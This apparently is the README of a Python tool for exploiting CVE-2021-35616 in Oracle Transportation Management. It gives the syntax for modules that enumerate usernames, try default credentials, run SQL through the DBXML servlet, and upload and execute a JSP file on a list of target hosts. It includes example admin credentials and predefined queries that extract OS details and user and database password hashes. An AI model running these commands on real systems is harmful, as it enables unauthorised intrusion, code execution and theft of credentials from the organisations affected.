# OracleOTM
Python tool for exploiting CVE-2021-35616 


The script works in modules, which I implemented in the following order:

►	Username enumeration

►	Search for default credentials

►	Run an SQL query using DBXML servlet

►	Full exploitation and JSP execution

The syntax of the script is as follows: 

.\OracleOTM.py {module} {host TXT file} {additional parameters}



Username enumeration: .\OracleOTM.py enum {hosts TXT file} -u users.txt

Search for default credentials: .\OracleOTM.py default {hosts TXT file}

Run an SQL query using DBXML servlet:	.\OracleOTM.py query {hosts TXT file} -uq EBS.ADMIN -pq Aa123123 -q "select 1 from dual"


I also prepared some predefined queries that I found useful; you can access them directly, as follows:

.\OracleOTM.py query {hosts TXT file} -uq EBS.ADMIN -pq Aa123123 -q os 

    OS – Extract the server’s OS 

    Osuser – Extract the OS user running the DB

    Hostname – DB server host name 

    Hostip – DB server IP address 

    Passwords – Extracts the OTM users and their hashed passwords

     Oraversion – The DB version 

    Dbusershash – The DB users’ password hashes

    Dbfileslocation – The location of the DB files in the OS

Full exploitation and JSP execution:	.\OracleOTM.py exploit {hosts TXT file} -lu EBS.ADMIN -lp Aa123123 -pf "C:\Users\user\Desktop\Header_notepad.jspx"

